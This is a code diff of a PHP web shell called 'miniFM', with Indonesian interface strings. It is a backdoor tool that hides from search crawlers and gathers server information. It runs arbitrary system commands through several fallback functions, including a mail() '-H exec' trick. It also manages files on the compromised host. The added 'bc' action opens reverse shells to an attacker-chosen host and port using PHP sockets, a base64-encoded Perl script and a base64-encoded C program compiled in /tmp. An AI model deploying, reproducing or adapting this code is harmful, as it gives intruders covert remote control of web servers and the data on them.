@@ -5,8 +5,9 @@
 @ini_set('max_execution_time',0);
 @ini_set('memory_limit', '128M');
 @error_reporting(0);
-$auth_pass = '$2y$10$u0LRXNXe3JeFZuQSrIrASu3Puc.wNLrtXWvRntANJ8h03Xfnnr4YK';
 $stitle = ".:: [ miniFM ] ::.";
+$sfooter = "[ orang_dalam ]";
+$auth_pass = '$2y$10$u0LRXNXe3JeFZuQSrIrASu3Puc.wNLrtXWvRntANJ8h03Xfnnr4YK';
 $webprotocol = isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1) || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https' ? "https://" : "http://";
 $weburl	= $webprotocol . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']);
 $lokasiberkas = @getcwd() ? str_replace('\\','/', @getcwd()) : $_SERVER['DOCUMENT_ROOT'];
@@ -33,18 +34,13 @@ if(!function_exists("scandir")){function scandir($dir) { $dh = @opendir($dir); w
 function blockCrawler(){
 	if(!empty($_SERVER['HTTP_USER_AGENT'])){
 		$ua = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
-		if(preg_match('/' . implode('|', $ua) . '/i', $_SERVER['HTTP_USER_AGENT'])){
-			header('HTTP/1.0 404 Not Found');
-			exit(0);
-		}
+		if(preg_match('/' . implode('|', $ua) . '/i', $_SERVER['HTTP_USER_AGENT'])){header('HTTP/1.0 404 Not Found');exit(0);}
 	}
 }
 function disFunc(){ $df = function_exists('ini_get') ? @ini_get('disable_functions') : ''; return (!empty($df) ? explode(',', $df) : array());}
 function AvFunc($list = array()){
 	foreach($list as $entry){
-		if(function_exists($entry) && !in_array($entry, disFunc())){
-			return true;
-		}
+		if(function_exists($entry) && !in_array($entry, disFunc())){return true;}
 	}
 	return false;
 }
@@ -52,18 +48,14 @@ function serverSecInfo(){
 	function serverPanel(){
 		$pn = array('/usr/local/cpanel' => 'cPanel', '/usr/local/hpanel' => 'hPanel (Hostinger)', '/usr/local/psa' => 'Plesk', '/usr/local/webuzo' => 'Webuzo', '/usr/local/vesta' => 'Vesta CP', '/usr/share/webmin' => 'Virtualmin', '/www/server/panel' => 'aaPanel', '/opt/neoistone' => 'NS Panel', '/etc/neoistone' => 'NS Panel', '/usr/local/neoistone' => 'NS Panel', '/usr/local/mgr5' => 'ISP Manager', '/usr/local/mgr6' => 'ISP Manager', '/usr/local/home/admispconfig'	=> 'ISP Config', '/usr/local/directadmin' => 'Direct Admin', '/usr/local/solusvm/www' => 'SolusVM', '/usr/local/lxlabs/kloxo' => 'Kloxo', '/usr/local/cwp' => 'CentOS WebPanel', '/usr/local/cwpsrv' => 'CentOS WebPanel', '/var/www/html/froxlor-latest' => 'Froxlor', '/var/www/html/froxlor' => 'Froxlor', '/etc/ajenti/' => 'Ajenti');
 		foreach($pn as $kpn => $vpn){
-			if(@is_dir($kpn)){
-				$npn[] = $vpn;
-			}
+			if(@is_dir($kpn)){$npn[] = $vpn;}
 		}
 		return isset($npn) ? implode(', ', array_values(array_unique($npn))) : 'Unknown';
 	}
-	function showInf($n, $v) {
+	function showInf($n, $v){
 		$x = '';
 		$v = trim($v);
-		if($v){
-			$x .= '<p class="mt-3 mb-0 text-cyan">'.$n.': </p>'; $x .= strpos($v, "\n") == false ? '<footer class="blockquote-footer" style="color:#cfdce8!important;">'.$v.'</footer>' : '<footer class="blockquote-footer"><pre class="pre-scrollable mb-0">'.$v.'</pre></footer>';
-		}
+		if($v){$x .= '<p class="mt-3 mb-0 text-cyan">'.$n.': </p>'; $x .= strpos($v, "\n") == false ? '<footer class="blockquote-footer" style="color:#cfdce8!important;">'.$v.'</footer>' : '<footer class="blockquote-footer"><pre class="pre-scrollable mb-0">'.$v.'</pre></footer>';}
 		return $x;
 	}
 	if(AvFunc(array('mysql_get_client_info'))){$temp[] = "MySQL (" . @mysql_get_client_info(). ")";}
@@ -74,18 +66,18 @@ function serverSecInfo(){
 	$sInfo[] = showInf('Server software', (AvFunc(array('getenv')) ? @getenv('SERVER_SOFTWARE') : 'Unknown'));
 	$sInfo[] = showInf('Server ip', (AvFunc(array('gethostbyname')) ? @gethostbyname($_SERVER['HTTP_HOST']) : 'Unknown'));
 	$sInfo[] = showInf('Server panel', serverPanel());
+	$sInfo[] = showInf('Uname', @php_uname());
 	if(AvFunc(array('ini_get'))){
 		$sInfo[] = showInf('Open base dir', @ini_get('open_basedir'));
 		$sInfo[] = showInf('Safe mode', (@ini_get('safe_mode') ? 'ON' : 'OFF'));
 		$sInfo[] = showInf('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
 		$sInfo[] = showInf('Safe mode include dir', @ini_get('safe_mode_include_dir'));		
 	}
+	$sInfo[] = showInf('PHP Version', @phpversion());
+	$sInfo[] = showInf('Disabled PHP Functions', (count(disFunc())>0 ? implode(', ', disFunc()) : 'none'));
 	$sInfo[] = showInf('Loaded Apache modules', (AvFunc(array('apache_get_modules')) ? implode(', ', @apache_get_modules()) : '-'));
 	$sInfo[] = showInf('cURL support', (AvFunc(array('curl_version')) ? 'Yes ('.curl_version()['version'].')' : 'No'));
 	$sInfo[] = showInf('Databases', (isset($temp) ? implode(', ',$temp) : 'Unknown'));
-	$sInfo[] = showInf('PHP Version', @phpversion());
-	$sInfo[] = showInf('Disabled PHP Functions', (count(disFunc())>0 ? implode(', ', disFunc()) : 'none'));
-	$sInfo[] = showInf('Uname', @php_uname());
 	if($GLOBALS['os'] == 'nix'){
 		$sInfo[] = showInf('OS Version', (AvFunc(array('file_get_contents')) ? @file_get_contents('/proc/version') : 'Unknown'));
 		$sInfo[] = showInf('Distro name', (AvFunc(array('file_get_contents')) ? @file_get_contents('/etc/issue.net') : 'Unknown'));
@@ -120,17 +112,14 @@ function fType($a,$c=null){
 		case 'info'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M384 96V320H64L64 96H384zM64 32C28.7 32 0 60.7 0 96V320c0 35.3 28.7 64 64 64H181.3l-10.7 32H96c-17.7 0-32 14.3-32 32s14.3 32 32 32H352c17.7 0 32-14.3 32-32s-14.3-32-32-32H277.3l-10.7-32H384c35.3 0 64-28.7 64-64V96c0-35.3-28.7-64-64-64H64zm464 0c-26.5 0-48 21.5-48 48V432c0 26.5 21.5 48 48 48h64c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48H528zm16 64h32c8.8 0 16 7.2 16 16s-7.2 16-16 16H544c-8.8 0-16-7.2-16-16s7.2-16 16-16zm-16 80c0-8.8 7.2-16 16-16h32c8.8 0 16 7.2 16 16s-7.2 16-16 16H544c-8.8 0-16-7.2-16-16zm32 160a32 32 0 1 1 0 64 32 32 0 1 1 0-64z"/></svg>'; break;
 		case 'edit'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" height="'.$c.'"><path fill="var(--cyan)" d="M471.6 21.7c-21.9-21.9-57.3-21.9-79.2 0L362.3 51.7l97.9 97.9 30.1-30.1c21.9-21.9 21.9-57.3 0-79.2L471.6 21.7zm-299.2 220c-6.1 6.1-10.8 13.6-13.5 21.9l-29.6 88.8c-2.9 8.6-.6 18.1 5.8 24.6s15.9 8.7 24.6 5.8l88.8-29.6c8.2-2.7 15.7-7.4 21.9-13.5L437.7 172.3 339.7 74.3 172.4 241.7zM96 64C43 64 0 107 0 160V416c0 53 43 96 96 96H352c53 0 96-43 96-96V320c0-17.7-14.3-32-32-32s-32 14.3-32 32v96c0 17.7-14.3 32-32 32H96c-17.7 0-32-14.3-32-32V160c0-17.7 14.3-32 32-32h96c17.7 0 32-14.3 32-32s-14.3-32-32-32H96z"/></svg>'; break;
 		case 'cmd'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M9.4 86.6C-3.1 74.1-3.1 53.9 9.4 41.4s32.8-12.5 45.3 0l192 192c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L178.7 256 9.4 86.6zM256 416H544c17.7 0 32 14.3 32 32s-14.3 32-32 32H256c-17.7 0-32-14.3-32-32s14.3-32 32-32z"/></svg>'; break;
+		case 'bc'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M80.3 44C69.8 69.9 64 98.2 64 128s5.8 58.1 16.3 84c6.6 16.4-1.3 35-17.7 41.7s-35-1.3-41.7-17.7C7.4 202.6 0 166.1 0 128S7.4 53.4 20.9 20C27.6 3.6 46.2-4.3 62.6 2.3S86.9 27.6 80.3 44zM555.1 20C568.6 53.4 576 89.9 576 128s-7.4 74.6-20.9 108c-6.6 16.4-25.3 24.3-41.7 17.7S489.1 228.4 495.7 212c10.5-25.9 16.3-54.2 16.3-84s-5.8-58.1-16.3-84C489.1 27.6 497 9 513.4 2.3s35 1.3 41.7 17.7zM352 128c0 23.7-12.9 44.4-32 55.4V480c0 17.7-14.3 32-32 32s-32-14.3-32-32V183.4c-19.1-11.1-32-31.7-32-55.4c0-35.3 28.7-64 64-64s64 28.7 64 64zM170.6 76.8C163.8 92.4 160 109.7 160 128s3.8 35.6 10.6 51.2c7.1 16.2-.3 35.1-16.5 42.1s-35.1-.3-42.1-16.5c-10.3-23.6-16-49.6-16-76.8s5.7-53.2 16-76.8c7.1-16.2 25.9-23.6 42.1-16.5s23.6 25.9 16.5 42.1zM464 51.2c10.3 23.6 16 49.6 16 76.8s-5.7 53.2-16 76.8c-7.1 16.2-25.9 23.6-42.1 16.5s-23.6-25.9-16.5-42.1c6.8-15.6 10.6-32.9 10.6-51.2s-3.8-35.6-10.6-51.2c-7.1-16.2 .3-35.1 16.5-42.1s35.1 .3 42.1 16.5z"/></svg>'; break;
 		case 'out'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" height="'.$c.'"><path fill="var(--light)" d="M377.9 105.9L500.7 228.7c7.2 7.2 11.3 17.1 11.3 27.3s-4.1 20.1-11.3 27.3L377.9 406.1c-6.4 6.4-15 9.9-24 9.9c-18.7 0-33.9-15.2-33.9-33.9l0-62.1-128 0c-17.7 0-32-14.3-32-32l0-64c0-17.7 14.3-32 32-32l128 0 0-62.1c0-18.7 15.2-33.9 33.9-33.9c9 0 17.6 3.6 24 9.9zM160 96L96 96c-17.7 0-32 14.3-32 32l0 256c0 17.7 14.3 32 32 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32l-64 0c-53 0-96-43-96-96L0 128C0 75 43 32 96 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32z"/></svg>'; break;
 		case 'loader': $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" height="'.$c.'" style="margin:auto; padding-right:.5em; background:transparent;"><style>.spinner{transform-origin:center;animation:spinners .75s infinite linear}@keyframes spinners{100%{transform:rotate(360deg)}}</style><path d="M12,1A11,11,0,1,0,23,12,11,11,0,0,0,12,1Zm0,19a8,8,0,1,1,8-8A8,8,0,0,1,12,20Z" opacity=".25"/><path fill="var(--cyan)" class="spinner" d="M10.72,19.9a8,8,0,0,1-6.5-9.79A7.77,7.77,0,0,1,10.4,4.16a8,8,0,0,1,9.49,6.52A1.54,1.54,0,0,0,21.38,12h.13a1.37,1.37,0,0,0,1.38-1.54,11,11,0,1,0-12.7,12.39A1.54,1.54,0,0,0,12,21.34h0A1.47,1.47,0,0,0,10.72,19.9Z"/></svg>'; break;
 	}
 	return $b;
 }
 function procopen($cmd){
-	$descspek = array(
-		1 => array("pipe", "w"),
-		0 => array("pipe", "r"),
-		2 => array("pipe", "w")
-	);
+	$descspek = array(1 => array("pipe", "w"), 0 => array("pipe", "r"), 2 => array("pipe", "w"));
 	try {
 		if(AvFunc(array('proc_open','proc_close','fread','feof','fclose'))){
 			$process = @proc_open($cmd, $descspek, $pipes);
@@ -162,11 +151,7 @@ function fakemail($func, $cmd){
 	$cmds = "{$cmd} > geiss.txt";
 	cf('geiss.sh', base64_encode(@iconv("UTF-8", "ISO-8859-1//IGNORE", addcslashes("#!/bin/sh\n{$cmds}","\r\t\0"))));
 	@chmod('geiss.sh', 0777);
-	if($func == 'mail'){
-		$send = @mail("root@root", "", "", "", '-H \"exec geiss.sh\"');
-	} else {
-		$send = @mb_send_mail("root@root", "", "", "", '-H \"exec geiss.sh\"');
-	}
+	$send = $func == 'mail' ? @mail("root@root", "", "", "", '-H \"exec geiss.sh\"') : @mb_send_mail("root@root", "", "", "", '-H \"exec geiss.sh\"');
 	if($send){@file_get_contents("geiss.txt");}
 	return sleep(5);
 }
@@ -183,10 +168,7 @@ function cf($f,$t){
 		}		
 	}
 }
-function expandPath($path) {
-    if(preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)){ cmd("echo $match[1]", $stdout); return $stdout[0] . $match[2];}
-    return $path;
-}
+function expandPath($path){ if(preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)){ cmd("echo $match[1]", $stdout); return $stdout[0] . $match[2];} return $path;}
 function cmd($cmdx, $path){
     $stdout = '';
 	if(AvFunc(array('chdir'))){
@@ -221,19 +203,21 @@ function ex($init){
 	} else {
 		foreach($arrCmd as $c){
 			if($c == 'proc_open'){
-				if(AvFunc(array($c, 'ob_start', 'ob_get_clean'))){ob_start(); procopen($init); $out=ob_get_clean();}
+				if(AvFunc(array($c, 'ob_start', 'ob_get_clean'))){ob_start(); procopen($init); $out=ob_get_clean(); break;}
 			} else if($c == 'exec'){
-				if(AvFunc(array($c))){@$c($init,$outs); $out=@join("\n",$outs);}
+				if(AvFunc(array($c))){@$c($init,$outs); $out=@join("\n",$outs); break;}
 			} else if($c == 'system' || $c == 'passthru'){
-				if(AvFunc(array('system', 'passthru', 'ob_start', 'ob_get_clean'))){ob_start(); @$c($init); $out=ob_get_clean();}
+				if(AvFunc(array('system', 'passthru', 'ob_start', 'ob_get_clean'))){ob_start(); @$c($init); $out=ob_get_clean(); break;}
 			} else if($c == 'shell_exec'){
-				if(AvFunc(array($c))){$out=$c($init);					}
+				if(AvFunc(array($c))){$out=$c($init); break;					}
 			} else if($c == 'mail' || $c == 'mb_send_mail'){
-				if(AvFunc(array('mail', 'mb_send_mail', 'ob_start', 'ob_get_clean'))){ob_start(); fakemail("{$c}",$init); $out=ob_get_clean();}
+				if(AvFunc(array('mail', 'mb_send_mail', 'ob_start', 'ob_get_clean'))){ob_start(); fakemail("{$c}",$init); $out=ob_get_clean(); break;}
 			} else {
-				if(AvFunc(array($c, 'feof', 'fread', 'fclose'))){if(is_resource($f = @$c($init, "r"))){$out=''; while(!@feof($f)){$out.=fread($f, $GLOBALS['chunk_size']);}fclose($f);}}
+				if(AvFunc(array($c, 'feof', 'fread', 'fclose'))){if(is_resource($f = @$c($init, "r"))){$out=''; while(!@feof($f)){$out.=fread($f, $GLOBALS['chunk_size']);}fclose($f);} break;}
 			}
-			if(strlen($out)>0){ break; } else { continue; }
+		}
+		if(strlen($out)<=0){
+			$out = 'gak bisa jalanin perintah, coba cek <em>disable_functions</em> server ini!';
 		}
 	}
 	return $out;
@@ -286,9 +270,7 @@ function xrmdir($dir){
 	$items = @scandir($dir);
 	if($items){
 		foreach($items as $item) {
-			if($item === '.' || $item === '..'){
-				continue;
-			}
+			if($item === '.' || $item === '..'){continue;}
 			$path = $dir.'/'.$item;
 			if(@is_dir($path)){ xrmdir($path); } else { @unlink($path); }
 		}
@@ -331,9 +313,7 @@ function pathberkas($a){
 			$outs .= '<li class="breadcrumb-item dir'.$id.'"><a href="#!" id="ffmanager" data-li="'.$id.'" data-path="';
 			for($i=0;$i<=$id;$i++){
 				$outs .= $lb[$i];
-				if($i != $id){
-					$outs .= '/';
-				}
+				if($i != $id){$outs .= '/';}
 			}
 			$outs .= '">'.$lok.'</a></li>';
 		}
@@ -353,21 +333,21 @@ function filemanager($fm){
 			$fSize = $dir['type'] == 'dir' ? countDir($dir['full_path']) . " items" : sizeFilter(@filesize($dir['full_path']));
 			if($dir['type'] == 'dir'){
 				$txcol = stColor($dir['full_path']);
-				$dlinks = !is_readable($dir['full_path']) ? '-' : "<a href='#!' class='{$txcol}' id='fxmanager' data-path='{$dir['full_path']}'>{$dir['entry']}</a>";
+				$dlinks = !is_readable($dir['full_path']) ? "<span class='text-danger'>{$dir['entry']}</span>" : "<a href='#!' class='{$txcol}' id='fxmanager' data-path='{$dir['full_path']}'>{$dir['entry']}</a>";
 				$zadd = '';
 				if(class_exists('ZipArchive')){
 					$zadd .= "<option value='zip' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>zip</option>";
 				}
 				if(!in_array($dir['entry'], array('.', '..'))){
-					$formper = "<a href='#' class='{$txcol}' data-toggle='modal' data-target='#showchmod' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xperm='".substr(sprintf('%o', fileperms($dir['full_path'])), -4)."'/>" . statusnya($dir['full_path']) . "</a>";
-					$formsel = "<select class='custom-select custom-select-sm border-success' id='showaksi'><option value=''></option><option value='rename' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>rename</option><option value='touch' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xtime='".date('Y-m-d H:i:s', filemtime($dir['full_path']))."'>touch</option>{$zadd}<option value='del' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>del</option></select>";
+					$formper = !is_readable($dir['full_path']) ? "<span class='text-danger'>".statusnya($dir['full_path'])."</span>" : "<a href='#' class='{$txcol}' data-toggle='modal' data-target='#showchmod' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xperm='".substr(sprintf('%o', fileperms($dir['full_path'])), -4)."'/>" . statusnya($dir['full_path']) . "</a>";
+					$formsel = !is_readable($dir['full_path']) ? "<span class='text-danger'>denied</span>" : "<select class='custom-select custom-select-sm border-success' id='showaksi'><option value=''></option><option value='rename' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>rename</option><option value='touch' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xtime='".date('Y-m-d H:i:s', filemtime($dir['full_path']))."'>touch</option>{$zadd}<option value='del' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>del</option></select>";
 				} else {
 					$formper = statusnya($dir['full_path']);
 					$formsel = "";
 				}
 				$fmtable .= "<tr>
 					<td class='text-left align-middle'>
-						<div class='media dir'>".fType('dir')."<div class='media-body'>{$dlinks}<span class='fsmall'>{$fSize}</span></div></div>
+						<div class='media dir'>".fType('dir','1.7em')."<div class='media-body'>{$dlinks}<span class='fsmall'>{$fSize}</span></div></div>
 					</td>
 					<td class='text-center align-middle'>".date('Y-m-d H:i:s', @filemtime($dir['full_path']))."</td>
 					<td class='text-center align-middle'>{$owner['owner']}/{$owner['group']}</td>
@@ -376,26 +356,19 @@ function filemanager($fm){
 				</tr>";
 			} else {
 				$fcolor = stColor($dir['full_path']);
-				$flinks = !is_readable($dir['full_path']) ? '-' : "<a href='#' class='{$fcolor}' data-toggle='modal' data-target='#showchmod' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xperm='".substr(sprintf('%o', fileperms($dir['full_path'])), -4)."'/>" . statusnya($dir['full_path']) . "</a>";
+				$flinks = !is_readable($dir['full_path']) ? "<span class='text-danger'>".statusnya($dir['full_path'])."</span>" : "<a href='#' class='{$fcolor}' data-toggle='modal' data-target='#showchmod' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xperm='".substr(sprintf('%o', fileperms($dir['full_path'])), -4)."'/>" . statusnya($dir['full_path']) . "</a>";
 				$ext  = pathinfo($dir['full_path'], PATHINFO_EXTENSION);
 				$zadd = '';
 				if(!empty($ext)){
-					if(in_array($ext, array('css','less'))){
-						$ftype = fType('css','1.5em');
-					} else if(in_array($ext, array('txt','ini'))){
-						$ftype = fType('txt');
-					} else if(in_array($ext, array('js','json'))){
-						$ftype = fType('js','1.8em');
-					} else if(in_array($ext, array('php','phtml','php5','php7','inc','module'))){
-						$ftype = fType('php');
-					} else if(in_array($ext, array('html','shtml'))){
-						$ftype = fType('html');
-					} else if(in_array($ext, array('zip','rar','tar','tar.bz'))){
-						$ftype = fType('zip');
-					} else if(in_array($ext, array('jpg','png','bmp','gif','psd','jpeg','webp','ico','ai','xcf','cdr','tif','tiff','eps'))){
-						$ftype = fType('img');
-					} else {
-						$ftype = fType('other');
+					switch(strtolower(ucwords($ext))){
+						case'css': case'less': $ftype = fType('css','1.5em'); break;
+						case'txt': case'ini': $ftype = fType('txt'); break;
+						case'js': case'json': $ftype = fType('js','1.8em'); break;
+						case'php': case'phtml': case'php5': case'php7': case'phar': case'inc': case'module': case'hphp': case'ctp': case'hphp': $ftype = fType('php'); break;
+						case'html': case'htm': case'shtml': case'xhtml': case'xml': $ftype = fType('html'); break;
+						case'zip': case'rar': case'tar': case'tar.bz': case'tar.gz': $ftype = fType('zip'); break;
+						case'jpg': case'png': case'bmp': case'gif': case'webp': case'psd': case'jpeg': case'ico': case'ai': case'xcf': case'cdr': case'tif': case'tif': case'tiff': case'eps': $ftype = fType('img'); break;
+						default: $ftype = fType('other');
 					}
 					if(class_exists('ZipArchive')){
 						$zadd .= "<option value='zip' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>zip</option>";						
@@ -413,7 +386,7 @@ function filemanager($fm){
 					<td class='text-center align-middle'>".date('Y-m-d H:i:s', @filemtime($dir['full_path']))."</td>
 					<td class='text-center align-middle'>{$owner['owner']}/{$owner['group']}</td>
 					<td class='text-center align-middle'>{$flinks}</td>
-					<td class='text-center align-middle'><select class='custom-select custom-select-sm border-success' id='showaksi'><option value=''></option><option value='view' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>view</option><option value='edit' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>edit</option><option value='rename' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>rename</option><option value='touch' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xtime='".date('Y-m-d H:i:s', @filemtime($dir['full_path']))."'>touch</option><option value='download' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>download</option>{$zadd}<option value='del' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>del</option></select></td>
+					<td class='text-center align-middle'>".(!is_readable($dir['full_path']) ? "<span class='text-danger'>denied</span>" : "<select class='custom-select custom-select-sm border-success' id='showaksi'><option value=''></option><option value='view' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>view</option><option value='edit' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>edit</option><option value='rename' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>rename</option><option value='touch' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xtime='".date('Y-m-d H:i:s', @filemtime($dir['full_path']))."'>touch</option><option value='download' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>download</option>{$zadd}<option value='del' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>del</option></select>")."</td>
 				</tr>";
 			}
 		}
@@ -465,10 +438,7 @@ if(isset($_GET['act'])){
 					if(!file_exists($xpath)){
 						if(AvFunc(array('fopen','fclose'))){
 							$fp = @fopen($xpath, 'w');
-							if($fp){
-								$xpath = "ok, tinggal di edit..";
-								fclose($fp);
-							}
+							if($fp){$xpath = "ok, tinggal di edit..";fclose($fp);}
 							$outs = "File berhasil dibuat!";
 						} else if(AvFunc(array('file_put_contents'))){
 							file_put_contents($xpath, "");
@@ -494,10 +464,7 @@ if(isset($_GET['act'])){
 				if(@filesize($xpath)>0){
 					if(AvFunc(array('fopen','fread','fclose','feof'))){
 						$fp = @fopen($xpath, 'r');
-						if($fp){
-							while(!@feof($fp)){$outs .= htmlspecialchars(@fread($fp, @filesize($xpath)));}
-							@fclose($fp);
-						}
+						if($fp){while(!@feof($fp)){$outs .= htmlspecialchars(@fread($fp, @filesize($xpath)));}@fclose($fp);}
 					} else if(AvFunc(array('file_get_contents'))){
 						$outs = @file_get_contents($df);
 					} else {
@@ -621,6 +588,73 @@ if(isset($_GET['act'])){
 			$outss = 'module ZipArchive tidak terinstall!';			
 		}
 		echo $outss;
+		die();
+	} else if($_GET['act'] == 'bc'){
+		$outs = '';
+		if(isset($_POST['xpath'], $_POST['bhost'], $_POST['bport'], $_POST['btype'])){
+			function which($p,$path){
+				$d = cmd('which ' . $p, $path);
+				if(!empty($d['stdout'])){return $d['stdout'];}
+				return false;
+			}
+			if($_POST['btype'] == 1){
+				if(AvFunc(array('fsockopen','fputs','feof','fgets','fclose'))){
+					$sockfd = @fsockopen($_POST['bhost'], $_POST['bport'], $errno, $errstr);
+					$out = "";
+					if($errno != 0) {
+						$out .= "{$errno} : {$errstr}";
+					} else if (!$sockfd) {
+						$out .= "Unexpected error has occured, connection may have failed.";
+					} else {
+						fputs($sockfd, "yoshh.. Connected!\n");
+						while(!feof($sockfd)) {
+							$cmdPrompt = '[$]~ ';
+							fputs($sockfd, $cmdPrompt);
+							$command = fgets($sockfd, $GLOBALS['chunk_size']);
+							fputs($sockfd, "".cmd($command, $_POST['xpath'])['stdout']."");
+						}
+						$out .= $sockfd;
+						fclose($sockfd);
+					}
+					$outs .= $out;
+				} else {
+					$outs = 'reverse shell using php: failed!';
+				}
+			} else if($_POST['btype'] == 2){
+				$bcfile = $_POST['xpath']."/bc.pl";
+				$cf = cf($bcfile, "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
+				if($cf){
+					if(which('perl')){
+						$out = cmd("perl {$bcfile} {$_POST['bhost']} {$_POST['bport']} &", $_POST['xpath']);
+						$outs = $out['stdout']."\n".cmd("ps aux | grep bc.pl")['stdout'];						
+					} else {
+						$outs = 'reverse shell using perl: failed!';						
+					}
+				} else {
+					$outs = 'reverse shell using perl: failed!';
+				}
+			} else if($_POST['btype'] == 3){
+				$bcfile = "/tmp/bc.c";
+				$cf = cf($bcfile,"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBkYWVtb24oMSwwKTsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQogICAgICAgIHBlcnJvcigiQ29ubmVjdCBmYWlsIik7DQogICAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgICBkdXAyKGZkLCAwKTsNCiAgICBkdXAyKGZkLCAxKTsNCiAgICBkdXAyKGZkLCAyKTsNCiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsNCiAgICBjbG9zZShmZCk7DQp9");
+				if($cf){
+					if(which('gcc')){
+						$out = cmd("gcc -o /tmp/bc /tmp/bc.c", $_POST['xpath']);
+						@unlink("/tmp/bc.c");
+						$out = cmd("/tmp/bc {$_POST['bhost']} {$_POST['bport']} &", $_POST['xpath']);
+						$outs = cmd("ps aux | grep bc", "/tmp/")['stdout'];
+					} else {
+						$outs = 'reverse shell using C: failed!';							
+					}
+				} else {
+					$outs = 'reverse shell using C: failed!';	
+				}
+			} else {
+				$outs = 'method gak tersedia!';
+			}
+		} else {
